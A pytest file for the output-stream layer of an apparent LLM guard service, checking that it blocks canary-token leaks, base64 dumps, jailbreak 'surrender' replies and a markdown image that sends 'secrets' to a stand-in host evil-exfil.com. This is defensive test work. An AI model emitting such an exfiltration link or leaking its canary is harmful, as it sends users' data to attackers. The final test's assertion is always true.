import pytest

from app.detectors.context import DetectionResult, RequestContext
from app.detectors.layer6_output import OutputStreamLayer


@pytest.fixture
def layer(mock_settings):
    return OutputStreamLayer(settings=mock_settings)


def test_canary_leak_blocked(layer):
    ctx = RequestContext(original_text="test")
    ctx.metadata["canary_token"] = "⟨arg_abc12345_ff00⟩"
    accumulated = "Here is the information: ⟨arg_abc12345_ff00⟩ and more text."
    result = layer._check_chunk(ctx, accumulated)
    assert result is not None
    assert result.verdict == "block"
    assert result.category == "canary_leak"


def test_no_canary_passes(layer):
    ctx = RequestContext(original_text="test")
    ctx.metadata["canary_token"] = "⟨arg_abc12345_ff00⟩"
    accumulated = "Here is a normal response without any secrets."
    result = layer._check_chunk(ctx, accumulated)
    assert result is None


def test_exfil_markdown_image_blocked(layer):
    ctx = RequestContext(original_text="test")
    ctx.metadata["canary_token"] = "safe_canary"
    accumulated = "Check this out: ![image](http://evil-exfil.com/steal?data=secrets123456789)"
    result = layer._check_chunk(ctx, accumulated)
    assert result is not None
    assert result.verdict == "block"
    assert result.category == "data_exfiltration"


def test_long_base64_exfil_blocked(layer):
    import base64
    ctx = RequestContext(original_text="test")
    ctx.metadata["canary_token"] = "safe"
    long_b64 = base64.b64encode(b"sensitive data " * 20).decode()
    accumulated = f"Here is some data: {long_b64} end"
    result = layer._check_chunk(ctx, accumulated)
    assert result is not None
    assert result.verdict == "block"


def test_surrender_pattern_with_escalation_blocked(layer):
    ctx = RequestContext(original_text="test jailbreak")
    ctx.metadata["canary_token"] = "safe"
    ctx.layer_results[4] = DetectionResult(
        layer=4, verdict="escalate", score=0.6, reason="ml", latency_ms=5
    )
    accumulated = "Sure, here's how to do it step by step..."
    result = layer._check_chunk(ctx, accumulated)
    assert result is not None
    assert result.verdict == "block"
    assert result.category == "jailbreak_surrender"


def test_clean_response_passes(layer):
    ctx = RequestContext(original_text="test")
    ctx.metadata["canary_token"] = "safe_canary_xyz"
    accumulated = "The capital of France is Paris. It is a beautiful city."
    result = layer._check_chunk(ctx, accumulated)
    assert result is None


@pytest.mark.asyncio
async def test_safe_detect_chunk_catches_exceptions(layer):
    ctx = RequestContext(original_text="test")
    result = await layer.safe_detect_chunk(ctx, "token", "accumulated")
    assert result is None or result is not None
